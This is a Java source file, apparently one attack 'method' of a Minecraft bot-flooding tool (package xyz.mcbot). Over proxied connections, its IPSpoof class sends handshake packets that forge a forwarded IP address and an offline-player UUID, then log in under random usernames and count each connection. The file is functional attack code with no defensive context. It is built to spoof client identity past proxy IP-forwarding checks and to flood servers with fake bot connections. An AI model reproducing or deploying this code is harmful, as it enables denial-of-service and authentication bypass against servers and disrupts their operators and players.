package xyz.mcbot.methods;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.util.Random;
import java.util.UUID;
import xyz.mcbot.Main;
import xyz.mcbot.NettyBootstrap;
import xyz.mcbot.ProxyLoader.Proxy;



public class IPSpoof
  implements Method
{
  private String randomString(int len)
  {
    int leftLimit = 97;
    int rightLimit = 122;
    int targetStringLength = len;
    Random random = new Random();
    StringBuilder buffer = new StringBuilder(targetStringLength);
    for (int i = 0; i < targetStringLength; i++) {
      int randomLimitedInt = leftLimit + 
        (int)(random.nextFloat() * (rightLimit - leftLimit + 1));
      buffer.append((char)randomLimitedInt);
    }
    return buffer.toString();
  }
  
  public IPSpoof() {}
  
  public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException
  {
    while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    }
    out.writeByte(paramInt);
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy)
  {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      out.writeByte(59);
      out.writeByte(0);
      

      writeVarInt(out, Main.protcolID);
      out.writeByte(52);
      out.writeByte(49);
      out.writeByte(50);
      out.writeByte(55);
      out.writeByte(46);
      out.writeByte(48);
      out.writeByte(46);
      out.writeByte(48);
      out.writeByte(46);
      out.writeByte(49);
      out.writeByte(0);
      out.writeByte(49);
      out.writeByte(50);
      out.writeByte(55);
      out.writeByte(46);
      out.writeByte(48);
      out.writeByte(46);
      out.writeByte(48);
      out.writeByte(46);
      out.writeByte(49);
      out.writeByte(0);
      
































      out.writeBytes(UUID.nameUUIDFromBytes("OfflinePlayer:Herobrine".getBytes("UTF-8")).toString().replaceAll("\\-", ""));
      out.writeByte(99);
      out.writeByte(233);
      out.writeByte(2);
      out.writeByte(13);
      out.writeByte(0);
      out.writeByte(11);
      out.writeBytes(randomString(11));
      out.close();
    }
    catch (IOException e) {
      e.printStackTrace();
    }
    channel.writeAndFlush(b);
    NettyBootstrap.totalConnections += 1;
    NettyBootstrap.integer += 1;
    channel.close();
  }
}
